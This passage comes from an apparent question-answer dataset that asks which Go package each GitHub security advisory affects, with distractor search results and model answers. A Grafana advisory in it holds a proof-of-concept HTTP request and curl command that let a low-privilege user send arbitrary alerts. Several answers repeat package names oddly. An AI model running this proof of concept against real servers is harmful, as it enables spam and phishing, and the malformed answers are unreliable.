of a violated invariant by sending a `MsgVerifyInvariant` with the name of the invariant. Processing this message takes extra processing power hence a `ConstantFee` was introduced on the chain that is charged as extra from the reporter for the extra computational work. This is supposed to avert spammers on the chain making nodes do extra computations using this transaction. By not charging the `ConstantFee`, the transactions related to invariant checking are relatively cheaper compared to the computational need and other transactions.\n\nThat said, the submitter still has to pay the transaction fee to put the transaction on the network, hence using this weakness for spamming is limited by the usual mechanisms.\n\nSynthetic testing showed up to a 20% increase in CPU usage on a validator node that is spammed by hundreds of `MsgVerifyInvariant` messages which still makes this an expensive operation to carry out on a live blockchain network.\n\n### Patches\nThe `ConstantFee` charge of the `x/crisis` module will either be fixed or disabled in an upcoming regular release of the Cosmos SDK.\n\nThe `x/crisis` module was originally intended to allow chains to halt rather than continue with some unknown behavior in the case of an invariant violation (safety over liveness). However, as chains mature, and especially as the potential [cost of halting increases](https://github.com/osmosis-labs/osmosis/issues/570), chains should consider carefully what invariants they really want to halt for, and what invariants are just sort of helpful sanity checks.\n\nThe SDK team is working on new modules that allow chain developers to fine-tune the chain invariants and the necessary actions.\n\nHence, the decision was made that the `x/crisis` module will be deprecated when new modules take over its responsibilities.\n\n### Workarounds\nThere is no workaround posted. Validators are advised to leave some extra computing room on their servers for possible spamming scenarios. (This is a good measure in any case.)\n\n### References\nSDK developer epic about invariant checking: https://github.com/cosmos/cosmos-sdk/issues/15706\n. Top 1 search result is go:github.com/kiali/kiali. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cosmos/cosmos-sdk."}]}, {"id": "GHSA-8qxh-2gh8-r923", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nThis [vulnerability dubbed \"Barberry\" affects the Cosmos SDK framework](https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825) used by `cheqd-node` as base.\n\nIt impacts the way Cosmos SDK handles vesting accounts, and can therefore be a high-impact vulnerability for any network running the framework.\n\nThere is no vulnerability in the DID/resource modules for `cheqd-node`.\n\n### Patches\nNode operators are requested to upgrade to [cheqd-node v1.4.4](https://github.com/cheqd/cheqd-node/releases/tag/v1.4.4). This is not a state-breaking release and does not require a coordinated upgrade across all node operators.\n\nThis vulnerability was patched in [Cosmos SDK v0.46.13](https://github.com/cosmos/cosmos-sdk/releases/tag/v0.46.13). Since this version switches to Go v1.19 and also changes the namespace of many Cosmos protobuf packages, the Barberry fix was [backported to cheqd's fork of Cosmos SDK](https://github.com/cheqd/cosmos-sdk/releases/tag/v0.46.10-barberry).\n\n### Mitigation\nWhen at least ~**33**% of the voting power of the network has deployed the recommended version of the software, any attack would be unsuccessful but cause a chain halt.\n\nOnce at least ~**67**% of the voting power of the network has deployed recommended version of the software, the attack would be unsuccessful _without_ a chain halt.\n\n### Workarounds\nNo. Node operators are recommended to upgrade to the latest release version.\n\n### References\n- [\"Barberry\" vulnerability security advisory](https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825)\n- [Cosmos SDK v0.46.13 release notes](https://github.com/cosmos/cosmos-sdk/releases/tag/v0.46.13)\n. Top 1 search result is go:ktbs.dev/teler. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cheqd/cheqd-node."}]}, {"id": "GHSA-h65h-v7fw-4p38", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: HashiCorp Consul 1.4.0 through 1.5.0 has Incorrect Access Control. Keys not matching a specific ACL rule used for prefix matching in a policy can be deleted by a token using that policy even with default deny settings configured.\n\n### Specific Go Packages Affected\ngithub.com/hashicorp/consul/acl. Top 1 search result is go:github.com/helm/helm. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/consul."}]}, {"id": "GHSA-455c-vqrf-mghr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost Apps Framework fails to verify that a secret provided in the incoming webhook request allowing an attacker to\u00a0modify the contents of the post sent by the Apps.\n\n. Top 1 search result is go:github.com/go-yaml/yaml. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-rm8v-mxj3-5rmq", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\n\nDecrypting AES-CBC encrypted JWE has Potential Padding Oracle Attack Vulnerability.\n\n### Details\n\nOn [v2.0.10](https://github.com/lestrrat-go/jwx/releases/tag/v2.0.10), decrypting AES-CBC encrypted JWE may return an error \"failed to generate plaintext from decrypted blocks: invalid padding\":\n\nhttps://github.com/lestrrat-go/jwx/blob/8840ffd4afc5839f591ff0e9ba9034af52b1643e/jwe/internal/aescbc/aescbc.go#L210-L213\n\nReporting padding error causes [Padding Oracle Attack](https://en.wikipedia.org/wiki/Padding_oracle_attack) Vulnerability.\nRFC 7516 JSON Web Encryption (JWE) says that we **MUST NOT** do this.\n\n> 11.5.  Timing Attacks\n> To mitigate the attacks described in RFC 3218 [RFC3218], the\n> recipient MUST NOT distinguish between format, padding, and length\n> errors of encrypted keys.  It is strongly recommended, in the event\n> of receiving an improperly formatted key, that the recipient\n> substitute a randomly generated CEK and proceed to the next step, to\n> mitigate timing attacks.\n\nIn addition, the time to remove padding depends on the length of the padding.\nIt may leak the length of the padding by Timing Attacks.\n\nhttps://github.com/lestrrat-go/jwx/blob/796b2a9101cf7e7cb66455e4d97f3c158ee10904/jwe/internal/aescbc/aescbc.go#L33-L66\n\nTo mitigate Timing Attacks, it MUST be done in constant time.\n\n### Impact\n\nThe authentication tag is verified, so it is not an immediate attack.\n. Top 1 search result is go:github.com/coredns/coredns. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/lestrrat-go/jwx/v2 github.com/lestrrat-go/jwx."}]}, {"id": "GHSA-7c94-gvvj-r3mg", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nThis vulnerability affects the [`ibc-go` package for those running full nodes, dubbed \"Huckleberry\"](https://forum.cosmos.network/t/ibc-security-advisory-huckleberry/10731). According to their advisory:\n\n> This issue is low-severity in general, and it has a low impact and likelihood of exploitation. Depending on how a full node is architected, this issue could potentially yield a high or critical severity vulnerability.\n\nThere is no vulnerability in the DID/resource modules for cheqd-node.\n\n### Patches\nNode operators are requested to upgrade to [cheqd-node v1.4.2](https://github.com/cheqd/cheqd-node/releases/tag/v1.4.2). This is a non-state breaking release, and does not require a coordinated upgrade across all node operators.\n\n### Workarounds\nNo. Node operators are recommended to upgrade to the latest release version.\n\n### References\n- [\"Huckleberry\" IBC security advisory](https://forum.cosmos.network/t/ibc-security-advisory-huckleberry/10731)\n- [`ibc-go` v6.1.1 release notes](https://github.com/cosmos/ibc-go/releases/tag/v6.1.1)\n. Top 1 search result is go:github.com/u-root/u-root. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cheqd/cheqd-node."}]}, {"id": "GHSA-x2w4-c67p-g44j", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Grafana is an open-source platform for monitoring and observability. \n\nUsing public dashboards users can query multiple distinct data sources using mixed queries. However such query has a possibility of crashing a Grafana instance.\n\nThe only feature that uses mixed queries at the moment is public dashboards, but it's also possible to cause this by calling the query API directly.\n\nThis might enable malicious users to crash Grafana instances through that endpoint.\n\nUsers may upgrade to version 9.4.12 and 9.5.3 to receive a fix.. Top 1 search result is go:gogs.io/gogs. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/grafana/grafana github.com/grafana/grafana."}]}, {"id": "GHSA-7xpv-4pm9-xch2", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nMetachain cannot process a cross-shard miniblock.\nAn invalid transaction with the wrong username on metachain is not treated correctly on the metachain transaction processor. This is strictly a processing issue that could have happened on MultiversX chain. If an error like this had occurred, the metachain would have stopped notarizing blocks from the shard chains. The resuming of notarization is possible only after applying a patched binary version. \n \n### Patches\nIntroduce processIfTxErrorCrossShard for metachain transaction processor. \n\n### Workarounds\nNo\n\n### References\nNo\n. Top 1 search result is go:github.com/jaegertracing/jaeger. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/multiversx/mx-chain-go."}]}, {"id": "GHSA-xhg5-42rf-296r", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nAn attacker who controls or compromises a registry can lead a user to verify the wrong artifact.\n\n### Patches\nThe problem has been fixed in the release [v1.0.0-rc.6](https://github.com/notaryproject/notation-go/releases/tag/v1.0.0-rc.6). Users should upgrade their notation-go library to [v1.0.0-rc.6](https://github.com/notaryproject/notation-go/releases/tag/v1.0.0-rc.6) or above.\n\n### Workarounds\nUser should use secure and trusted container registries.\n\n### Credits\nThe `notation` project would like to thank Adam Korczynski (@AdamKorcz) for responsibly disclosing the issue found during an security audit (facilitated by OSTIF and sponsored by CNCF) and Shiwei Zhang (@shizhMSFT), Pritesh Bandi (@priteshbandi)  for root cause analysis.\n. Top 1 search result is go:github.com/nats-io/nats-server. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/notaryproject/notation-go."}]}, {"id": "GHSA-4c32-w6c7-77x4", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: An SQL injection issue was discovered in EaseProbe before 2.1.0 when using MySQL/PostgreSQL data checking. This problem has been fixed in v2.1.0; users should upgrade to this version.\n\nThe vulnerability was discovered by the [Oxeye research](https://www.oxeye.io/) team.\n. Top 1 search result is go:github.com/opencontainers/runc. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/megaease/easeprobe."}]}, {"id": "GHSA-gqx9-h3w2-fprg", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Gitpod before 2022.11.3 allows XSS because redirection can occur for some protocols outside of the trusted set of three (vscode: vscode-insiders: jetbrains-gateway:).. Top 1 search result is go:github.com/kubernetes/kubernetes. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/gitpod-io/gitpod."}]}, {"id": "GHSA-r7wr-4w5q-55m6", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nWhen the [Gateway API](https://docs.cilium.io/en/v1.13/network/servicemesh/gateway-api/gateway-api/) is enabled in Cilium, the absence of a check on the namespace in which a [ReferenceGrant](https://gateway-api.sigs.k8s.io/api-types/referencegrant/) is created could result in Cilium gaining visibility of secrets (including certificates) and services across namespaces.\n\nAn attacker on an affected cluster can configure Cilium to use cluster secrets or communicate with services that it should not have access to.\n\nGateway API functionality is disabled by default.\n\n### Patches\n\nThis vulnerability is fixed in Cilium release 1.13.4.\n\nCilium versions <1.13 are not affected.\n\n### Workarounds\n\nThere is no workaround to this issue.\n\n### Acknowledgements\nThe Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @meyskens for investigating and fixing the issue.\n\n### For more information\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: [security@cilium.io](mailto:security@cilium.io) - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.\n. Top 1 search result is go:github.com/helm/helm. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cilium/cilium."}]}, {"id": "GHSA-qfc5-6r3j-jj22", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: # x/crisis does NOT cause chain halt\n\n### Impact\nIf an invariant check fails on a Cosmos SDK network and a transaction is sent to the `x/crisis` module to halt the chain, the chain does not halt. All versions of the `x/crisis` module is affected on all versions of the Cosmos SDK.\n\n### Details\nThe `x/crisis` module is supposed to allow anyone to halt a chain in the event of a violated invariant by sending a `MsgVerifyInvariant` with the name of the invariant. Processing this message is supposed to cause the nodes to panic. However, because the panic is within a transaction, it is caught by the SDK\u2019s built-in panic-recovery machinery and just treated as a normal \u201cinvalid\u201d transaction (ie. it returns a non-zero abci Code). Thus the `x/crisis` transactions don\u2019t actually cause chains to halt. If there is an invariant violation, it can be confirmed with an `x/crisis` transaction, but it won\u2019t cause any nodes to halt, they will just continue processing blocks.\n\nThat said, any node running with `start --inv-check-period X` will actually panic when it runs the periodic check (though it will still not panic just by processing an `x/crisis` transaction). Since this panic is located in EndBlock, it is not caught by the panic-recovery machinery and does actually crash the node. Presumably few if any nodes actually run with this in production because of how long the invariant checks take, and this runs all of them every `X` blocks.\n\n### Patches\nNo patches will be released.\n\nThe `x/crisis` module was originally intended to allow chains to halt rather than continue with some unknown behaviour in the case of an invariant violation (safety over liveness). However, as chains mature, and especially as the potential [cost of halting increases](https://github.com/osmosis-labs/osmosis/issues/570), chains should consider carefully what invariants they really want to halt for, and what invariants are just sort of helpful sanity checks, but may not be worth halting for.\n\nIn some cases, chains have already broken the invariant calculations but have dealt with the consequences off-chain or during development. Halting these chains would be counter-productive.\n\nThe SDK team is working on new modules that allow chain developers to fine-tune the chain invariants and the necessary actions.\n\nHence, the decision was made that the `x/crisis` module will not be patched for chain halts. The module will be deprecated when new modules take over its responsibilities.\n\n### Workarounds\nIn case of a valid invariant check failure that requires a chain halt, the network validators are encouraged to coordinate off-chain for network halts. This has been an already established process for security patches.\n\n### References\nSDK developer epic about invariant checking: https://github.com/cosmos/cosmos-sdk/issues/15706\nPublic report: https://github.com/cosmos/cosmos-sdk/issues/15325. Top 1 search result is go:go.elastic.co/apm. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cosmos/cosmos-sdk."}]}, {"id": "GHSA-hq4m-4948-64cc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nIn versions of Kyverno prior to 1.10.0, resources which have the `deletionTimestamp` field defined can bypass validate, generate, or mutate-existing policies, even in cases where the `validationFailureAction` field is set to `Enforce`. \n\nThis situation occurs as resources pending deletion were being consciously exempted by Kyverno, as a way to reduce processing load as policies are typically not applied to objects which are being deleted. \n\nHowever, this could potentially result in allowing a malicious user to leverage the [Kubernetes finalizers feature](https://kubernetes.io/docs/concepts/overview/working-with-objects/finalizers/) by setting a finalizer which causes the Kubernetes API server to set the `deletionTimestamp` and then not completing the delete operation as a way to explicitly to bypass a Kyverno policy. \n\nNote that this is not applicable to Kubernetes Pods but, as an example, a Kubernetes Service resource can be manipulated using an indefinite finalizer to bypass policies.\n\n\n### Patches\nThis is resolved in Kyverno 1.10.0.\n\n### Workarounds\nThere is no known workaround.\n\n### References\n_Are there any links users can visit to find out more?_\n. Top 1 search result is go:github.com/syncthing/syncthing. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/kyverno/kyverno."}]}, {"id": "GHSA-xc8m-28vv-4pjc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A security issue was discovered in Kubelet that allows pods to bypass the seccomp profile enforcement. Pods that use localhost type for seccomp profile but specify an empty profile field, are affected by this issue. In this scenario, this vulnerability allows the pod to run in unconfined (seccomp disabled) mode. This bug affects Kubelet.. Top 1 search result is go:github.com/argoproj/argo-cd. What is the affected package?"}, {"from": "gpt", "value": "The affected package is k8s.io/kubernetes k8s.io/kubernetes k8s.io/kubernetes k8s.io/kubernetes."}]}, {"id": "GHSA-cvm3-pp2j-chr3", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nGrafana allows an attacker in the Viewer role, send alerts by API Alert - Test. The option is not available from the user panel UI for in the Viewer role. \n\n**Reason for the error**: The API does not check access to this function and allows it by users with the least rights, for example, the Viewer that does not see this option in the user panel. \n\nThis enables malicious users to abuse the functionality by sending multiple alert messages (e-mail, slack, etc\u2026), spamming users, prepare Phishing attack or blocked SMTP server / IP and automatically moved all message to spam folder, add to black list IP.\n\n\n### Details\nThe logged-in user, in the Viewer role, in the user panel, does not have access to the test option of sending an e-mail alert. \n\nView of the panel for the user in the Viewer role:\n![image](https://user-images.githubusercontent.com/1643385/232904030-e8a8338d-f5e3-4b04-80c3-32f2164a190e.png)\n\nAdmin role - View panel for admin role:\n![image](https://user-images.githubusercontent.com/1643385/232904264-c7aba0a5-0642-496b-998d-d500eb5ead7f.png)\n\nAdmin role - Next step \u2013 editing:\n![image](https://user-images.githubusercontent.com/1643385/232904388-ef2ee69e-3ee3-41a9-8687-305886c5c0b9.png)\n\nAdmin role - Additional options:\n![image](https://user-images.githubusercontent.com/1643385/232904480-dd493d34-d66d-47af-ab4f-3273ae8976bc.png)\n\n\n\n### PoC\n\n**HTTP Request by user in role Viewer**\n```\nPOST /api/alertmanager/grafana/config/api/v1/receivers/test HTTP/1.1\nHost: xxx\nCookie: grafana_session=xxx\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://xxx/alerting/notifications/receivers/grafana-default-email/edit?alertmanager=grafana\naccept: application/json, text/plain, */*\ncontent-type: application/json\n\u2026\n\n{\"receivers\":[{\"name\":\"test\",\"grafana_managed_receiver_configs\":[{\"settings\":{\"addresses\":\"<test@example.com>\",\n\"singleEmail\":true},\"secureSettings\":{},\"type\":\"email\",\"name\":\"test\",\"disableResolveMessage\":false}]}],\n\"alert\":{\"annotations\":{\"runbook_url\":\"http://example.com \",\"description\":\"tekst\",\"testowy\":\"test http://example.com\",\n\"more\":\"http://example.com \"},\"labels\":{}}}\n\n```\n\n**HTTP Response:**\n```\nHTTP/1.1 200 OK\nCache-Control: no-cache\nContent-Type: application/json\nExpires: -1\nPragma: no-cache\nX-Content-Type-Options: nosniff\nX-Frame-Options: deny\nX-Xss-Protection: 1; mode=block\nDate: Wed, 05 Apr 2023 10:43:00 GMT\nContent-Length: 471\n\n{\"alert\":{\"annotations\":{\"__value_string__\":\"[ metric='foo' labels={instance=bar} value=10 ]\",\"description\":\"tekst\",\n\"more\":\"http://example.com\",\"runbook_url\":\"http://example.com\",\"summary\":\"Notification test\",\n\"testowy\":\"testowy http://example.com\"},\"labels\":{\"alertname\":\"TestAlert\",\"instance\":\"Grafana\"}},\n\"receivers\":[{\"name\":\"test\",\"grafana_managed_receiver_configs\":[{\"name\":\"test\",\"uid\":\"ojUhNFL4k\",\"status\":\"ok\"}]}],\n\"notified_at\":\"2023-04-05T12:43:00.1430203+02:00\"}\n\n```\n\n## Result:\nThe attacker can send as a template alert or plain/text.\n\n![image](https://user-images.githubusercontent.com/1643385/232917993-1294cfe0-3040-4d04-a533-a72ecbc666c0.png)\n\n\n### Impact\nAs I showed above, an enabled user in the lowest role can execute an endpoint API that allows him to send an e-mail as an alert and impersonate its content. If modified accordingly, the recipient may fall victim to a Phishing attack or a targeted attack to block the SMTP server. \n\nFrom a practical point of view, this means that for each \"GrafanaReceiver\" e.g.: Slack, E-mail, etc.. You can send any alert message from user with the least privileged. \n\nCURL example \u2013 using a user session in the Viewer role:\n\n```\ncurl -i -s -k -X $'POST' \\\n    -H $'Host: localhost:3002' -H $'Content-Length: 386' -H $'sec-ch-ua: \\\"Not:A-Brand\\\";v=\\\"99\\\", \\\"Chromium\\\";v=\\\"112\\\"' -H $'accept: application/json, text/plain, */*' -H $'content-type: application/json' -H $'x-grafana-org-id: 1' -H $'sec-ch-ua-mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/527.36 (KHTML, like Gecko) Chrome/112.0.2615.50 Safari/11.36' -H $'sec-ch-ua-platform: \\\"macOS\\\"' -H $'Origin: http://localhost:3002' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: http://localhost:3002/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H $'Connection: close' \\\n    -b $'grafana_session=xxx' \\\n    --data-binary $'{\\\"receivers\\\":[{\\\"name\\\":\\\"test\\\",\\\"grafana_managed_receiver_configs\\\":[{\\\"settings\\\":{\\\"addresses\\\":\\\"<test@example.com>\\\",\\\"singleEmail\\\":true\\x0d\\x0a},\\\"secureSettings\\\":{},\\\"type\\\":\\\"email\\\",\\\"name\\\":\\\"test\\\",\\\"disableResolveMessage\\\":false}]}],\\\"alert\\\":{\\\"annotations\\\":{\\\"runbook_url\\\":\\\"http://example.com\\\",\\\"description\\\":\\\"tekst\\\",\\\"testowy\\\":\\\"testowy http://example.com\\\",\\x0d\\x0a\\\"more\\\":\\\"http://example.com\\\"\\x0d\\x0a},\\\"labels\\\":{}}}\\x0d\\x0a' \\\n    $'http://localhost:3002/api/alertmanager/grafana/config/api/v1/receivers/test'\n```\n\n### Mitigation\n\n1. In the SMTP server configuration settings, limit the ability to send multiple e-mails to the same e-mail address per unit of time / threshold. \n2. Check the API for the possibility of accessing this endpoint for other roles than admin\n. Top 1 search result is go:golang.org/x/text. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/grafana/grafana github.com/grafana/grafana github.com/grafana/grafana github.com/grafana/grafana github.com/grafana/grafana."}]}, {"id": "GHSA-rvrx-rrwh-r9p6", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nAn attacker who controls or compromises a registry can make the registry serve an infinite number of signatures for the artifact, causing a denial of service to the host machine running `notation verify`.\n\n### Patches\nThe problem has been fixed in the release [v1.0.0-rc.6](https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6). Users should upgrade their notation packages to [v1.0.0-rc.6](https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6) or above.\n\n### Workarounds\nUser should use secure and trusted container registries\n\n### Credits\nThe `notation` project would like to thank Adam Korczynski (@AdamKorcz) for responsibly disclosing the issue found during an security audit (facilitated by OSTIF and sponsored by CNCF) and Shiwei Zhang (@shizhMSFT) for root cause analysis.. Top 1 search result is go:github.com/hashicorp/consul. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/notaryproject/notation."}]}, {"id": "GHSA-hr9r-8phq-5x8j", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Overview\n\nOpenFGA versions v1.1.0 and prior are vulnerable to a DoS attack when certain Check and ListObjects calls are executed against authorization models that contain circular relationship definitions.\n\n### Am I Affected?\n\nYou are affected by this vulnerability if you are using OpenFGA v1.1.0 or earlier, and if you are executing certain [Check](https://openfga.dev/api/service#/Relationship%20Queries/Check) or [ListObjects](https://openfga.dev/api/service#/Relationship%20Queries/ListObjects) calls against a vulnerable authorization model. To see which of your models could be vulnerable to this attack, download OpenFGA v1.2.0 and run the following command: \n\n```\n./openfga validate-models --datastore-engine <ENGINE> --datastore-uri <URI> | jq .[] | select(.Error | contains(\"loop\"))\n```\n\nreplacing the variables `<ENGINE>` and `<URI>` as needed.\n\n### Fix\n\nUpgrade to v1.1.1.\n\n### Backward Compatibility\n\nIf you are not passing an invalid authorization model (as identified by running `./openfga validate-models`) as a parameter of your Check and ListObjects calls, this upgrade is backwards compatible. \n\nOtherwise, OpenFGA v1.1.1 will start returning HTTP 400 status codes on those calls.. Top 1 search result is go:github.com/nats-io/jwt. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/openfga/openfga."}]}, {"id": "GHSA-gm2g-2xr9-pxxj", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Insecure defaults in open-source Temporal Server before version 1.20 on all platforms allows an attacker to craft a task token with access to a namespace other than the one specified in the request. Creation of this task token must be done outside of the normal Temporal server flow. It requires the namespace UUID and information from the workflow history for the target namespace. Under these conditions, it is possible to interfere with pending tasks in other namespaces, such as marking a task failed or completed.\nIf a task is targeted for completion by the attacker, the targeted namespace must also be using the same data converter configuration as the initial, valid, namespace for the task completion payload to be decoded by workers in the target namespace.. Top 1 search result is go:github.com/apache/thrift. What is the affected package?"}, {"from": "gpt", "value": "The affected package is go.temporal.io/server."}]}, {"id": "GHSA-46v3-ggjg-qq3x", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nMultiple Cross-Site Scripting (XSS) vulnerabilities have been identified in the Rancher UI. \nCross-Site scripting allows a malicious user to inject code that is executed within another user's browser, allowing the attacker to steal sensitive information, manipulate web content, or perform other malicious activities on behalf of the victims. This could result in a user with write access to the affected areas being able to act on behalf of an administrator, once an administrator opens the affected web page.\n\nThe affected areas include the Projects/Namespaces and Auth Provider sections. The attacker needs to be authenticated and have write access to those features in order to exploit the vulnerabilities. Some of the permissions (roles) required are:\n\n- Project Owner.\n- Restricted Admin.\n- Configure Authentication.\n- Administrator.\n- Custom RBAC Role that provides write access on Projects or External Authentication Providers.\n\nFor users that suspect this vulnerability may have targeted their Rancher instance, we recommend rotating all API Keys and Kubeconfig tokens.\n\nIt's also advised to review logs and possibly rotate credentials stored as secrets in Rancher and downstream cluster, if you believe that users' credentials to access Rancher and its clusters might have been compromised.\n\n### Patches\nPatched versions include releases `2.6.13`, `2.7.4` and later versions.\n\n### Workarounds\nThere is no direct mitigation besides updating Rancher to a patched version.\n\n### Credits\nWe would like to recognize and thank @bybit-sec for the responsible disclosure of this security issue.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).. Top 1 search result is go:github.com/pomerium/pomerium. What is the affected package?"}, {"from": "gpt", "value": "The affected package is rancher/rancher rancher/rancher."}]}, {"id": "GHSA-rwcp-qrwg-56cg", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Casdoor v1.331.0 and below was discovered to contain a Cross-Site Request Forgery (CSRF) in the endpoint `/api/set-password`. This vulnerability allows attackers to arbitrarily change the victim user's password via supplying a crafted URL.. Top 1 search result is go:github.com/ulikunitz/xz. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/casdoor/casdoor."}]}, {"id": "GHSA-p976-h52c-26p6", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nA vulnerability has been identified which enables [Standard users](https://ranchermanager.docs.rancher.com/how-to-guides/new-user-guides/authentication-permissions-and-global-configuration/manage-role-based-access-control-rbac/global-permissions) or above to elevate their permissions to Administrator in the `local` cluster.\n\nThe `local` cluster means the cluster where Rancher is installed. It is named `local` inside the list of clusters in the Rancher UI.\n\nStandard users could leverage their existing permissions to manipulate Kubernetes secrets in the `local` cluster, resulting in the secret being deleted, but their read-level permissions to the secret being preserved. When this operation was followed-up by other specially crafted commands, it could result in the user gaining access to tokens belonging to service accounts in the `local` cluster.\n\nUsers that have custom global roles which grant `create` and `delete` permissions on `secrets` would also be able to exploit this vulnerability.\n\nUsers with [audit logs enabled](https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/enable-api-audit-log#enabling-api-audit-log) in Rancher can try to identify possible abuses of this issue by going through the logs. To sieve through the data filter by `kind: Secret` with `type: provisioning.cattle.io/cloud-credential`, then investigate all log entries that affect that specific resource. A secondary check would be to filter by all operations with `Opaque` Secrets within the `cattle-global-data` namespace.\n\nAfter patching, it is recommended that users review access methods to Rancher (including RBAC policies, tokens, and host-level node access), to ensure that no changes were made to persist access to users who have leveraged this vulnerability.\n\n### Patches\n\nPatched versions include releases `2.6.13`, `2.7.4` and later versions. \n\n### Workarounds\n\nThere is no direct mitigation besides updating Rancher to a patched version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).. Top 1 search result is go:gogs.io/gogs. What is the affected package?"}, {"from": "gpt", "value": "The affected package is rancher/rancher rancher/rancher."}]}, {"id": "GHSA-vpxf-q44g-w34w", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\n\nThere is a permission flaw in the Sealos billing system, which allows users to control the recharge resource account. sealos. io/v1/Payment, resulting in the ability to recharge any amount of 1 RMB.\n\n### Details\n\nThe reason is that sealos is in arrears. Egg pain, we can't create a terminal anymore. Let's charge for it:\n\nThen it was discovered that the charging interface had returned all resource information. Unfortunately, based on previous vulnerability experience, the namespace of this custom resource is still under the current user's control and may have permission to correct it.\n\n### PoC\ndisable by publish\n\n### Impact\n\n+ sealos public cloud user\n+ CWE-287 Improper Authentication. Top 1 search result is go:github.com/git-lfs/git-lfs. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/labring/sealos."}]}, {"id": "GHSA-fwv2-65wh-2w8c", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Issue\nSnowflake was informed via our bug bounty program of a command injection vulnerability in the Snowflake Golang driver via SSO browser URL authentication.\n\n### Impacted driver package: \ngosnowflake\n\n### Impacted version range: \nbefore [Version 1.6.19](https://community.snowflake.com/s/article/Go-Snowflake-Driver-Release-Notes)\n\n### Attack Scenario\nIn order to exploit the potential for command injection, an attacker would need to be successful in (1) establishing a malicious resource and (2) redirecting users to utilize the resource. The attacker could set up a malicious, publicly accessible server which responds to the 